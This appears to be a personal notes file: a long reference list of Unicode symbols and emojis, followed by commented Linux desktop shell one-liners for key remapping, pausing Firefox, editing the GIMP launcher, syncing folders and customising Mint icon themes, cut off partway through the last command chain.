ᾀ ᾁ ᾂ ᾃ ᾄ ᾅ ᾆ ᾇ ᾈ ᾉ ᾊ ᾋ ᾌ ᾍ ᾎ ᾏ ᾐ ᾑ ᾒ ᾓ ᾔ ᾕ ᾖ ᾗ ᾘ ᾙ ᾚ ᾛ ᾜ ᾝ ᾞ ᾟ ᾠ ᾡ ᾢ ᾣ ᾤ ᾥ ᾦ ᾧ
ᾨ ᾩ ᾪ ᾫ ᾬ ᾭ ᾮ ᾯ ᾰ ᾱ ᾲ ᾳ ᾴ ᾶ ᾷ Ᾰ Ᾱ Ὰ Ά ᾼ ᾽ ι ᾿ ῀ ῁ ῂ ῃ ῄ ῆ ῇ Ὲ Έ Ὴ Ή ῌ ῍ ῎ ῏
ῐ ῑ ῒ ΐ ῖ ῗ Ῐ Ῑ Ὶ Ί ῝ ῞ ῟ ῠ ῡ ῢ ΰ ῤ ῥ ῦ ῧ Ῠ Ῡ Ὺ Ύ Ῥ ῭ ΅ ` ῲ ῳ ῴ ῶ ῷ Ὸ Ό Ὼ Ώ ῼ ´ ῾
Ͱ ͱ Ͳ ͳ ʹ ͵ Ͷ ͷ ͺ ͻ ͼ ͽ ; ΄ ΅
Ά · Έ Ή Ί Ό Ύ Ώ ΐ Α Β Γ Δ Ε Ζ Η Θ Ι Κ Λ Μ Ν Ξ Ο Π Ρ Σ Τ Υ Φ Χ Ψ Ω
Ϊ Ϋ ά έ ή ί ΰ α β γ δ ε ζ η θ ι κ λ μ ν ξ ο π ρ ς σ τ υ φ χ ψ ω ϊ ϋ ό ύ ώ ϐ ϑ ϒ ϓ ϔ
ϕ ϖ ϗ Ϙ ϙ Ϛ ϛ Ϝ ϝ Ϟ ϟ Ϡ ϡ Ϣ ϣ Ϥ ϥ Ϧ ϧ Ϩ ϩ Ϫ ϫ Ϭ ϭ Ϯ ϯ ϰ ϱ ϲ ϳ ϴ ϵ ϶ Ϸ ϸ Ϲ Ϻ ϻ ϼ Ͻ Ͼ Ͽ
Ⓐ ⓐ ⒜ A a Ạ ạ Ả ả Ḁ ḁ Â Ã Ǎ ǎ Ấ ấ Ầ ầ Ẩ ẩ Ȃ ȃ Ẫ ẫ Ậ ậ À Á Ắ ắ Ằ ằ Ẳ ẳ Ẵ ẵ Ặ ặ Ā ā
Ą ą Ǟ Ȁ ȁ Å Ǻ ǻ Ä ä ǟ Ǡ ǡ â á å ã à ẚ Ȧ ȧ Ⱥ Å ⱥ Æ æ Ǽ Ǣ ǣ Ɐ Ꜳ ꜳ Ꜹ Ꜻ Ɑ ꜹ ꜻ ª ℀ ⅍ ℁
Ⓑ ⓑ ⒝ B b Ḃ ḃ Ḅ ḅ Ḇ ḇ Ɓ Ƀ ƀ ƃ Ƃ Ƅ ƅ ℬ
Ⓒ ⓒ ⒞ C c Ḉ ḉ Ć ć Ĉ ĉ Ċ ċ Č č Ç ç Ƈ ƈ Ȼ ȼ ℂ ℃ ℭ Ɔ ℅ ℆ ℄ Ꜿ ꜿ
Ⓓ ⓓ ⒟ D d Ḋ ḋ Ḍ ḍ Ḏ ḏ Ḑ ḑ Ḓ ḓ Ď ď Ɗ Ƌ ƌ Ɖ Đ đ ȡ ⅅ ⅆ Ǳ ǲ ǳ Ǆ ǅ ǆ ȸ
Ⓔ ⓔ ⒠ E e Ḕ ḕ Ḗ ḗ Ḙ ḙ Ḛ ḛ Ḝ ḝ Ẹ ẹ Ẻ ẻ Ế ế Ẽ ẽ Ề ề Ể ể Ễ ễ Ệ ệ Ē ē Ĕ ĕ Ė
ė Ę ę Ě ě È è É é Ê ê Ë ë Ȅ ȅ Ȩ ȩ Ȇ ȇ Ǝ ⱸ Ɇ ℇ ℯ ℮ Ɛ ℰ Ə ǝ ⱻ ɇ
Ⓕ ⓕ ⒡ F f Ḟ ḟ Ƒ ƒ ꜰ Ⅎ ⅎ ꟻ ℱ ℻
Ⓖ ⓖ ⒢ G g Ɠ Ḡ ḡ Ĝ ĝ Ğ ğ Ġ ġ Ģ ģ Ǥ ǥ Ǧ ǧ Ǵ ℊ ⅁ ǵ
Ⓗ ⓗ ⒣ H h Ḣ ḣ Ḥ ḥ Ḧ ḧ Ḩ ḩ Ḫ ḫ ẖ Ĥ ĥ Ȟ ȟ Ħ ħ Ⱨ ⱨ Ꜧ ℍ Ƕ ℏ ℎ ℋ ℌ ꜧ
Ⓘ ⓘ ⒤ I i Ḭ ḭ Ḯ ḯ Ĳ ĳ ì í î ï Ì Í Î Ï Ĩ ĩ Ī ī Ĭ ĭ Į į ı Ɨ ƚ Ỻ Ǐ ǐ ⅈ ⅉ ℹ
Ⓙ ⓙ ⒥ J j Ĵ ĵ ȷ ⱼ Ɉ ɉ ǰ ℑ ℐ
Ⓚ ⓚ ⒦ K k Ḱ ḱ Ḳ ḳ Ḵ ḵ Ķ ķ Ƙ ƙ Ꝁ ꝁ Ꝃ ꝃ Ꝅ ꝅ Ǩ ǩ Ⱪ ⱪ ĸ
Ⓛ ⓛ ⒧ L l Ḷ ḷ Ḹ ḹ Ḻ ḻ Ḽ ḽ Ĺ ĺ Ļ ļ Ľ İ ľ Ŀ ŀ Ł ł Ỉ ỉ Ị ị Ƚ Ⱡ Ꝉ ꝉ ⱡ Ɫ ꞁ ℒ Ǉ ǈ ǉ ⅃ ⅂ ℓ ȉ Ȉ Ȋ ȋ
Ⓜ ⓜ ⒨ M m Ḿ ḿ Ṁ ṁ Ṃ ṃ ꟿ ꟽ Ɱ Ʃ Ɯ ℳ
Ⓝ ⓝ ⒩ N n Ṅ ṅ Ṇ ṇ Ṉ ṉ Ṋ ṋ Ń ń Ņ ņ Ň ň Ǹ ǹ Ŋ Ɲ ñ ŉ Ñ Ƞ ƞ ŋ Ǌ ǋ ǌ ȵ ℕ №
Ⓞ ⓞ O o Ṍ ṍ Ṏ ṏ Ṑ ṑ Ṓ ṓ Ȫ ȫ Ȭ ȭ Ȯ ȯ Ȱ ȱ Ǫ ǫ Ǭ ǭ Ọ ọ Ỏ ỏ Ố ố Ồ ồ Ổ ổ Ỗ ỗ Ộ ộ Ớ ớ Ờ ờ Ở ở
Ỡ ỡ Ợ ợ Ơ ơ Ō ō Ŏ ŏ Ő ő Ò Ó Ô Õ Ö Ǒ Ȍ ȍ Ȏ ȏ Œ œ Ø Ǿ Ꝋ ǽ ǿ ℴ ⍥ ⍤ ⒪ ò ó ô õ ö ǒ ø Ꝏ ꝏ
Ⓟ ⓟ ⒫ ℗ P p Ṕ ṕ Ṗ ṗ Ƥ ƥ Ᵽ ℙ Ƿ ꟼ ℘
Ⓠ ⓠ ⒬ Q q Ɋ ɋ ℚ ℺ ȹ
Ⓡ ⓡ ⒭ R r Ŕ ŕ Ŗ ŗ Ř ř Ṙ ṙ Ṛ ṛ Ṝ ṝ Ṟ ṟ Ȑ ȑ Ȓ ȓ ɍ Ɍ Ʀ Ɽ ℞ Ꝛ ꝛ ℜ ℛ ℟ ℝ
Ⓢ ⓢ ⒮ S s Ṡ ṡ Ṣ ṣ Ṥ ṥ Ṧ ṧ Ṩ ṩ Ś ś Ŝ ŝ Ş ş Š š Ș ș ȿ ꜱ Ƨ ƨ ẞ ß ẛ ẜ ẝ ℠
Ⓣ ⓣ ⒯ T t Ṫ ṫ Ṭ ṭ Ṯ ṯ Ṱ ṱ Ţ ţ Ť ť Ŧ ŧ Ƭ Ʈ ẗ Ț Ⱦ ƫ ƭ ț ⱦ ȶ ℡ ™
Ⓤ ⓤ ⒰ U u Ṳ ṳ Ṵ ṵ Ṷ ṷ Ṹ ṹ Ṻ ṻ Ụ Ủ ủ Ứ Ừ ụ ứ Ử ử ừ ữ Ữ Ự ự Ũ ũ Ū ū Ŭ ŭ Ů ů
Ű ű Ǚ ǚ Ǘ ǘ Ǜ ǜ Ų ų Ǔ ǔ Ȕ ȕ Û û Ȗ ȗ Ù ù Ü ü Ư ú Ʉ ư Ʋ Ʊ
Ⓥ ⓥ ⒱ V v Ṽ ṽ Ṿ ṿ Ỽ Ʌ ℣ ⱱ ⱴ ⱽ
Ⓦ ⓦ ⒲ W w Ẁ ẁ Ẃ ẃ Ẅ ẅ Ẇ ẇ Ẉ ẉ Ŵ ŵ ẘ Ⱳ ⱳ
Ⓧ ⓧ ⒳ X x Ẋ ẋ Ẍ ẍ ℵ ×
Ⓨ ⓨ ⒴ y Y Ẏ ẏ Ỿ ỿ ẙ Ỳ ỳ Ỵ ỵ Ỷ ỷ Ỹ ỹ Ŷ ŷ Ƴ ƴ Ÿ ÿ Ý ý Ɏ ɏ Ȳ Ɣ ⅄ ȳ ℽ
Ⓩ ⓩ ⒵ Z z Ẑ ẑ Ẓ ẓ Ẕ ẕ Ź ź Ż ż Ž ž Ȥ ȥ Ⱬ ⱬ Ƶ ƶ ɀ ℨ ℤ
⟀ ⟁ ⟂ ⟃ ⟄ ⟇ ⟈ ⟉ ⟊ ⟐ ⟑ ⟒ ⟓ ⟔ ⟕ ⟖ ⟗ ⟘ ⟙ ⟚ ⟛ ⟜ ⟝ ⟞ ⟟ ⟠ ⟡ ⟢ ⟣ ⟤ ⟥ ⟦ ⟧ ⟨ ⟩ ⟪ ⟫ ⦀ ⦁ ⦂ ⦃ ⦄ ⦅ ⦆
⦇ ⦈ ⦉ ⦊ ⦋ ⦌ ⦍ ⦎ ⦏ ⦐ ⦑ ⦒ ⦓ ⦔ ⦕ ⦖ ⦗ ⦘ ⦙ ⦚ ⦛ ⦜ ⦝ ⦞ ⦟ ⦠ ⦡ ⦢ ⦣ ⦤ ⦥ ⦦ ⦧ ⦨ ⦩ ⦪ ⦫ ⦬ ⦭ ⦮ ⦯
⦰ ⦱ ⦲ ⦳ ⦴ ⦵ ⦶ ⦷ ⦸ ⦹ ⦺ ⦻ ⦼ ⦽ ⦾ ⦿ ⧀ ⧁ ⧂ ⧃ ⧄ ⧅ ⧆ ⧇ ⧈ ⧉ ⧊ ⧋ ⧌ ⧍ ⧎ ⧏ ⧐ ⧑ ⧒ ⧓ ⧔ ⧕ ⧖ ⧗
⧘ ⧙ ⧚ ⧛ ⧜ ⧝ ⧞ ⧟ ⧡ ⧢ ⧣ ⧤ ⧥ ⧦ ⧧ ⧨ ⧩ ⧪ ⧫ ⧬ ⧭ ⧮ ⧯ ⧰ ⧱ ⧲ ⧳ ⧴ ⧵ ⧶ ⧷ ⧸ ⧹ ⧺ ⧻
⧼ ⧽ ⧾ ⧿ ∀ ∁ ∂ ∃ ∄ ∅ ∆ ∇ ∈ ∉ ∊ ∋ ∌ ∍ ∎ ∏ ∐ ∑ − ∓ ∔ ∕ ∖ ∗ ∘ ∙ √ ∛ ∜ ∝ ∞
∟ ∠ ∡ ∢ ∣ ∤ ∥ ∦ ∧ ∨ ∩ ∪ ∫ ∬ ∭ ∮ ∯ ∰ ∱ ∲ ∳ ∴ ∵ ∶ ∷
∸ ∹ ∺ ∻ ∼ ∽ ∾ ∿ ≀ ≁ ≂ ≃ ≄ ≅ ≆ ≇ ≈ ≉ ≊ ≋ ≌ ≍ ≎ ≏ ≐ ≑ ≒ ≓ ≔ ≕ ≖ ≗ ≘ ≙ ≚ ≛ ≜ ≝ ≞ ≟ ≠ ≡ ≢ ≣ ≤ ≥ ≦ ≧ ≨ ≩
≪ ≫ ≬ ≭ ≮ ≯ ≰ ≱ ≲ ≳ ≴ ≵ ≶ ≷ ≸ ≹ ≺ ≻ ≼ ≽ ≾ ≿ ⊀ ⊁ ⊂ ⊃ ⊄ ⊅ ⊆ ⊇ ⊈ ⊉ ⊊ ⊋ ⊌ ⊍ ⊎ ⊏ ⊐ ⊑ ⊒ ⊓ ⊔
⊕ ⊖ ⊗ ⊘ ⊙ ⊚ ⊛ ⊜ ⊝ ⊞ ⊟ ⊠ ⊡ ⊢ ⊣ ⊤ ⊥ ⊦ ⊧ ⊨ ⊩ ⊪ ⊫ ⊬ ⊭ ⊮ ⊯ ⊰ ⊱ ⊲ ⊳ ⊴ ⊵ ⊶ ⊷ ⊸ ⊹ ⊺ ⊻ ⊼ ⊽ ⊾ ⊿ ⋀ ⋁ ⋂ ⋃ ⋄
⋅ ⋆ ⋇ ⋈ ⋉ ⋊ ⋋ ⋌ ⋍ ⋎ ⋏ ⋐ ⋑ ⋒ ⋓ ⋔ ⋕ ⋖ ⋗ ⋘ ⋙ ⋚ ⋛ ⋜ ⋝ ⋞ ⋟ ⋠ ⋡ ⋢ ⋣ ⋤ ⋥ ⋦ ⋧ ⋨ ⋩ ⋪ ⋫ ⋬ ⋭ ⋮ ⋯ ⋰ ⋱
⋲ ⋳ ⋴ ⋵ ⋶ ⋷ ⋸ ⋹ ⋺ ⋻ ⋼ ⋽ ⋾ ⋿ ✕ ✖ ✚ ◀ ▶ ❝ ❞ ★ ☆ ☼ ☂ ☺ ☹ ✄ ✈ ✌ ✎ ♪ ♫ ☀ ☁ ☔ ⚡ ❆ ☽ ☾ ✆ ✔ ☯ ☮ ☠ ⚑ ☬
✄ ✏ ♰ ✡ ✰ ✺ ⚤ ⚢ ⚣ ♕ ♛ ♚ ♬ ⓐ ⓑ ⓒ ⓓ ↺ ↻ ⇖ ⇗ ⇘ ⇙ ⟵ ⟷ ⟶ ⤴ ⤵ ⤶ ⤷ ➫ ➬ € ₤ ＄ ₩ ₪ ⟁ ⟐ ◆ ⎔ ░ ▢ ⊡ ▩ ⟡ ◎
◵ ⊗ ❖ Ω β Φ Σ Ξ ⟁ ⦻ ⧉ ⧭ ⧴ ∞ ≌ ⊕ ⋍ ⋰ ⋱ ✖ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ᴕ ⸨ ⸩ ❪ ❫ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
⓪ ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ➀ ➁ ➂ ➃ ➄ ➅ ➆ ➇ ➈ ➉ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
⓿ ❶ ❷ ❸ ❹ ❺ ❻ ❼ ❽ ❾ ❿ ➊ ➋ ➌ ➍ ➎ ➏ ➐ ➑ ➒ ➓ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
ᶅ ᶛ ᶜ ᶝ ᶞ ᶟ ᶠ ᶡ ᶢ ᶣ ᶤ ᶥ ᶦ ᶧ ᶨ ᶩ ᶪ ᶫ ᶬ ᶭ ᶮ ᶯ ᶰ ᶱ ᶲ ᶳ ᶴ ᶵ ᶶ ᶷ ᶹ ᶺ ᶻ ᶼ ᶽ ᶾ ᶿ
ᴀ ᴁ ᴂ ᴃ ᴄ ᴅ ᴆ ᴇ ᴈ ᴉ ᴊ ᴋ ᴌ ᴍ ᴎ ᴏ ᴐ ᴑ ᴒ ᴓ ᴔ ᴕ ᴖ ᴗ ᴘ ᴙ ᴚ ᴛ ᴜ ᴝ ᴞ ᴟ ᴠ ᴡ ᴢ ᴣ ᴤ ᴥ ᴦ ᴧ ᴨ ᴩ ᴪ ᴫ
ᴬ ᴭ ᴮ ᴯ ᴰ ᴱ ᴲ ᴳ ᴴ ᴵ ᴶ ᴷ ᴸ ᴹ ᴺ ᴻ ᴼ ᴽ ᴾ ᴿ ᵀ ᵁ ᵂ ᵃ ᵄ ᵅ ᵆ ᵇ ᵈ ᵉ ᵊ ᵋ ᵌ ᵍ ᵎ ᵏ ᵐ ᵑ ᵒ ᵓ ᵔ ᵕ ᵖ ᵗ ᵘ ᵙ ᵚ ᵛ ᵜ
ᵝ ᵞ ᵟ ᵠ ᵡ ᵢ ᵣ ᵤ ᵥ ᵦ ᵧ ᵨ ᵩ ᵪ ᵫ ᵬ ᵭ ᵮ ᵱ ᵲ ᵳ ᵵ ᵷ ᵸ ᵺ ᵻ ᷋ ᷌ ᷍ ᷎ ᷏ ᷓ ᷔ ᷕ ᷖ ᷗ ᷘ ᷙ ᷛ ᷜ ᷝ ᷞ ᷟ ᷠ ᷡ ᷢ ᷣ ᷤ ᷥ ᷦ ‘ ’ ‛ ‚ “ ” „ ‟ « » ‹ › Ꞌ  < > @
‧ ¨ ․ ꞉ : ⁚ ⁝ ⁞ ‥ … ⁖ ⸪ ⸬ ⸫ ⸭ ⁛ ⁘ ⁙ ⁏ ; ⦂ ⁃ ‐ ‑ ‒ - – ⎯ — ― _ ⁓ ⸛ ⸞ ⸟ ⸯ ¬ / \ ⁄ \ ⁄ | ⎜ ¦ ‖ ‗ † ‡
· • ⸰ ° ‣ ⁒ % ‰ ‱ & ⅋ § ÷ + ± = ꞊ ′ ″ ‴ ⁗ ‵ ‶ ‷ ‸ * ⁑ ⁎ ⁕ ※ ⁜ ⁂ ! ‼ ¡ ? ¿ ⸮ ⁇ ⁉ ⁈ ‽ ⸘ ¼ ½ ¾
² ³ © ® ™ ℠ ℻ ℅ ℁ ⅍ ℄ ¶ ⁋ ❡ ⁌ ⁍ ⸖ ⸗ ⸚ ⸓
( ) [ ] { } ⸨ ⸩ ❨ ❩ ❪ ❫ ⸦ ⸧ ❬ ❭ ❮ ❯ ❰ ❱ ❴ ❵ ❲ ❳ ⦗ ⦘ ⁅ ⁆ 〈 〉 ⏜ ⏝ ⏞ ⏟ ⸡ ⸠ ⸢ ⸣ ⸤ ⸥
⎡ ⎤ ⎣ ⎦ ⎨ ⎬ ⌠ ⌡ ⎛ ⎠ ⎝ ⎞ ⁀ ⁔ ‿ ⁐ ‾ ⎟ ⎢ ⎥ ⎪ ꞁ ⎮ ⎧ ⎫ ⎩ ⎭ ⎰ ⎱ ✈ ☀ ☼ ☁ ☂ ☔ ⚡ ❄ ❅ ❆ ☃
☉ ☄ ★ ☆ ☽ ☾  ☇ ☈ ⌂ ⌁ ⏧ ✆ ☎ ☏ ☑ ✓ ✔ ⎷ ⍻
✖ ✗ ✘ ☒ ✕ ☓  ☚ ☛ ☜  ☞ ☟ ☹ ☺ ☻ ☯ ⚘ ☮ ✝ ⚰ ⚱ ⚠ ☠ ☢ ⚔ ⚓ ⎈ ⚒ ⚑ ⚐ ☡ ❂ ⚕ ⚖ ⚗ ✇ ☣ ⚙ ☤ ⚚ ⚛ ⚜ ☥ ☦ ☧ ☨ ☩
† ☪ ☯ ☫ ☬ ☭ ✁ ✂ ✃ ✄ ✎ ✏ ✐  ✑ ✒ ✉ ✙ ✚ ✜ ✛ ♰ ♱ ✞ ✟ ✠ ✡ ☸ ✢ ✣ ✤ ✥ ✦ ✧ ✩ ✪ ✫ ✬ ✭ ✮ ✯ ✰ ✲ ✱ ✳ ✴ ✵ ✶ ✷ ✸
✹ ✺ ✻ ✼ ✽ ✾ ❀ ✿ ❁ ❃ ❇ ❈ ❉ ❊ ❋ ⁕ ☘ ❦ ❧ ☙ ❢ ❣ ♀ ♂ ⚲ ⚢ ⚣ ⚤ ⚥ ⚦ ⚧ ⚨ ⚩ ☿ ♁ ⚯ ♔ ♕ ♖ ♗ ♘ ♙ ♚ ♛ ♜ ♝ ♞ ♟ ☖
☗ ♠ ♣ ♦ ♥ ❤ ❥ ♡ ♢ ♤ ♧ ⚀ ⚁ ⚂ ⚃ ⚄ ⚅ ⚇ ⚆ ⚈ ⚉ ♨ ♩ ♪ ♫ ♬ ♭ ♮ ♯ ⌨ ⏏ ⎗ ⎘ ⎙ ⎚ ⌥ ⎇ ⌘ ⌦ ⌫ ⌧ ♲ ♳ ♴ ♵ ♶ ♷ ♸ ♹
♺ ♻ ♼ ♽ ⁌ ⁍ ⎌ ⌇ ⌲ ⍝ ⍟ ⍣ ⍤ ⍥ ⍨ ⍩ ⎋ ♃ ♄ ♅ ♆ ♇ ♈ ♉ ♊ ♋ ♌ ♍ ♎ ♏ ♐ ♑ ♒ ♓ ⏚ ⏛
┊ ○ ● ⚠ ✡ ° ⁂
😎 😘 😂 😆 😈 😱 😭 😅 😗 😜 💰😏 😡
✌ ☝ ✍ ☔ ⚡ ☕ ♿ ⌛ ⌚ ⚫ ⚓ 🐰 🕳
 ✦ ⬢ 🌳 💧 🐦 🛠 🐹 🐘 𝗥 ஃ 🐳 ☁️ 🅒 🐍 ☸️ 🛠 📦
❤️
⌽⌇ ⌍ ⌎⎌ ⌏ ⌐ ⌑ ⌔
⌙ ⌢ ⌣ ⌯ ⌬�
⍙Δ
𓆏⚪⚫
ᛉ卐
☭💰
🚺🍤🦐🐠🦀🐙🐡
✌😊💚💖😊💜🥀🌭⛺
😡
🏴󠁧󠁢󠁳󠁣󠁴󠁿
👹🤢🤮⛺🤣
🤔🔥
🦇
👦👧👅
💘 😁 💯
🖥 💋
☠️ ⚠️ 🎉 🐢
🐈 😠 💩 💨
🐟
壁紙はんぱねぇ。

    ¯\_(ツ)_/¯
Works on my machine

_________________¶_______
|               ||l “”|””\__,
|_______________|||___|__|__|]
(@)@)*************(@)(@)**(@)



Ţ̶̡̺̟̻͊͌͊͌̉̆͊̓͘͘͜͝ͅȞ̸̡̛͎̪̼͓̟̥̤̗͇͂̿̎̂̿̓́̃͜͠͝E̸̢͕̯̞̻̓ ̶̡̫̘̣̼͕̠͙̺͌Ŗ̶̪̖͗̃̈́͗͛̉͑̆͠͠͝I̴̧̡͉̗̠̤̳̼̼͌̂͌̔̑̀̃̒̔͂̈͘ͅT̷̠̫̭̽̇̿̑̉̋̈́͆̔͝Ȕ̶̢̦͉̱̟̳̣̌̄̌͛͒̄ͅA̷̢̺̖͓̟͚̠̻͌̐͑̑̔͋̊̽͌͂͘͝Ļ̷̡̪̼̹͇̫̬͂̓͒́ ̶̞̬̮̰̓͘H̷̢̛̗͇̯̦̘̠̟̳͈͍̗̐̇̚A̵̬̤͐͛̈́͘Ș̶̛͔̞̹͚͚͕̞͆̉̈́̋͌͋̽̓͝͠ ̸͇̪̙̥̯͇̒̆̏̈́͝͝B̶̠̖̟͍̣͙̬͋͗͛̒̇͒̈̕Ḙ̴̡̼͂́͐G̸͔̟͆̏̿͋͆̌̀̚̚͜Ö̶̧̪̮̤̤̀̈̎̀͗̉̏͝Ṇ̷̢̮̦͉̝͖̽̑̏̇̈́̓̕̕͜͝͝Ẻ̶̢͍͇̞̩̆̑̕͘̚͝͝ ̸͇̼̓́̉͂̎͐̿͊͂͝Å̵̙̗̣͍̎̈̚͠͝͝ͅN̷̛͍̞̰͌O̴̩̪̺͍͉͗͆́N̵̮͖̙͓͔̤͉̘̱͈̰̈́͌̄͊͜ ̴͉͓̖̺̬͐̈́̂̒̓̋T̴̤̙̩̳͖̗̗̼̗͎̽̽̾̊̿̄͜͝ͅH̶̨̀͋͋͒͒̐̽̋̀͐̉̀͜Ē̸̢̛̟̤͌͆̊͊̿́̏̍̚͠R̶̮̙͍͔̠͉̟̳̠̫̪̾͆͜͝E̵̞̥̻̹̫̽̀̑̊̿̑̉͝ ̸͔̭̪͙̠͙̹͖͊̐͜I̵̡̧̛̫͍͓͈̻̩͙̳̿̈́̎̾͋̀S̵̩͂͆̈̽̃̆ ̵̧͙̱̼̞̮̩̯̘̞̼͊̄̄̊͐͗͐͛̈́͂Ņ̸̩̝͈͕̯̟̟̰̈́̉̐͑͘͜ͅȌ̶̙̩̀̈̈́̀͐͠ ̸̨̙̞̣̤̥̮̻̌̑̃̃͠͝E̸̤͌̔̔͝S̵̡̫͕͓͕̪̆̃̈̇̔̓C̶̨͍͔̫͔͚̗̈́̎̿̃͘A̶͚̩͉̭͙̘̟̤̙͔̣͂̄͑̊̆͘͝ͅP̷̟͕͉̼̙̻͎̈̓͌͛͜Ē̸͉͔͓̈́̀͂̈́̌͒̑̚͝ ̶̧̛̞̣̤̞͌̐̆͂̎͒̓F̸̨͕̹͔͉̯̜̺͎̱͛̈̃͊͂̀̐̂̍̚͘R̸͙̠̯̈̂͊̃͗̍O̶̪̹̝̭͔̻̣͖̻̗̔̌͠M̴͔̜͓̗̣̞̩͉̮̈́̽͋͗̌̒͘͜͝ͅ ̸̛̬̫̝̻͚̗͉̺̋̀͊̐͆̍̄̉̈́͘͝Y̶͉̊͒̋̈́́́́̃̾Ŏ̸̟̞͖͍̐̓͐͊̿̆̔̓̈̌͠Ǘ̴̱̤͍͙̖̃̃̄̌̊̏͝͠R̷̼̥̳̙̓̈͜͝ ̴̢̺̗̘̪̰͖̜͖͙͙̽̆͜͝Ṡ̷̳͉͖̞̻̑͛̐̃Ỉ̴̡̡̖̦̳̩͈̭̝͖͋̎̑̔Ñ̵̡͎̥̈̌̑̈́̔̇͜͝S̴̢̡̬̝̪̪̪̪͓͇̟̔͂͑̈́͗͑͛͛͊͜͝
▄█▀ █▬█ █ █ █ █▀█▀

## Programming Languages
🅒   ## C/C++
🦀   ## Rust
🐹   ## Go
☕   ## Java
🔰   ## JS
🔻   ## Ruby
🐍   ## Python
🐘   ## PHP
🐪   ## Perl
🐫   ## OCaml
👑   ## Nim
🍏   ## Apple
🐳   ## Docker
💻   ## Shell

 🍃🌼🌺🍃🌸🍃🤎🙏🏽👵🏽👋🏾🇨🇦❤️🇺🇸🇺❤️🇨🇦
😳😥🤣🤣🌄

## Prompt
↳
√

COMMENT1
##==========================================
## #################################################
## ##    END Extra Characters
## #################################################
##==========================================
## os. hardware. keyboard. Change keyboard keys.
## Make PgUP/PgDOWN another Left/Right.
## cat /usr/share/X11/xkb/symbols/pc
##     key  <INS> {    [  Insert       ]   };
##     key <HOME> {    [  Home         ]   };
##     key <PGUP> {    [  Prior        ]   };
##     key <DELE> {    [  Delete       ]   };
##     key  <END> {    [  End          ]   };
##     key <PGDN> {    [  Next         ]   };
##
##     key   <UP> {    [  Up           ]   };
##     key <LEFT> {    [  Left         ]   };
##     key <DOWN> {    [  Down         ]   };
##     key <RGHT> {    [  Right        ]   };
## sudo su
## cp /usr/share/X11/xkb/symbols/pc /usr/share/X11/xkb/symbols/pc.default
## sed -i 's/Prior/Left/' /usr/share/X11/xkb/symbols/pc
## sed -i 's/Next/Right/' /usr/share/X11/xkb/symbols/pc

##
##
##
## #################################################
## ##    GUI Control
## #################################################
##==========================================
## GUI
## Get name of running Window Manager
$> wmctrl -m | grep Name: | awk '{print $2}'
##==========================================
## GUI
## Manually Pause/Unpause Firefox Process with POSIX-Signals
$> killall -STOP -m firefox
## Continue with:
$> killall -CONT -m firefox
## Suspends all Firefox Threads. Results in Zero CPU load.  Useful when having 100+ Tabs open and you temporarily need the power elsewhere.
## Be careful - might produce RACE CONDITIONS or LOCKUPS in other processes or FF itself.
##==========================================
## GUI
## Edit the Gimp launcher file to disable the splash screen
$> printf '%s\n' ',s/^Exec=[^ ]*/& -s/' w q | ed /usr/share/applications/gimp.desktop
## sed is designed for editing streams - editing files is what ed is for! You can get consistent behavior on any UNIX platform with the above one-liner.
## The printf command sends a series of editing commands to ed, each separated by a newline. In this case, the substitution command ,s/^Exec=[^ ]*/& -s/ is nearly the same as in sed, appending a space and a -s to the line starting with Exec=. The only difference is the comma at the beginning designating the lines to operate on. This is shorthand for 1,$, which tells ed to apply the command to the first through the last lines (i.e., the entire file). w tells ed to write the file, and q to quit.
##==========================================
## GUI
## Backup all files under home directory to a USB drive with zenity gui
$> DIR1=$(zenity --entry --text "Enter first directory to sync.") && DIR2=$(zenity --entry --text "Enter second directory to sync.") && rsync -avu $DIR1 $DIR2 && rsync -avu $DIR2 $DIR1  && notify-send  "Syncing" "The files are syncing." && zenity --info "Finished sync."
##==========================================
## GUI
## List firefox addons
$> jshon -e addons -a -e defaultLocale -e name -u < ~/.mozilla/firefox/*.[dD]efault/extensions.json
##==========================================
## gui. Remove link/shortcut icon overlays in mint linux
## Get rid of shortcut/symlink/symbolic-link arrows from on top of desktop icons.
$> sudo cp emblem-symbolic-link-tranparent.png /usr/share/icons/Mint-X/emblems/16/emblem-symbolic-link.png
$> sudo cp emblem-symbolic-link-tranparent.png /usr/share/icons/Mint-X/emblems/22/emblem-symbolic-link.png
$> sudo cp emblem-symbolic-link-tranparent.png /usr/share/icons/Mint-X/emblems/24/emblem-symbolic-link.png
$> sudo cp emblem-symbolic-link-tranparent.png /usr/share/icons/Mint-X/emblems/32/emblem-symbolic-link.png
$> sudo cp emblem-symbolic-link-tranparent.png /usr/share/icons/Mint-X/emblems/48/emblem-symbolic-link.png
$> sudo gtk-update-icon-cache /usr/share/icons/Mint-X
##==========================================
## Create new Mint-X-White and Mint-X-LtBlue icon themes
$> mkdir ~/.icons && \
$> cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-LtBlue && \
$> cd ~/.icons/Mint-X-LtBlue && \
$> grep -ri -l "#a7c6df" ~/.icons/Mint-X-LtBlue | xargs sed -i -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g' && \
$> grep -ri -l "#a7c6df" ~/.icons/Mint-X-LtBlue | xargs sed -i -e 's/a7c6df/ffffff/g' -e 's/308fba/cce8ff/g' && \
$> cp -r /usr/share/icons/Mint-X-Aqua ~/.icons/Mint-X-White && \
$> cd ~/.icons/Mint-X-White && \
$> grep -ri -l "#a7c6df" ~/.icons/Mint-X-White | xargs sed -i -e 's/path3369-7" style="opacity:0.3/path3369-7" style="opacity:1/g' -e 's/path6127" style="opacity:0.4/path6127" style="opacity:1/g'  && \
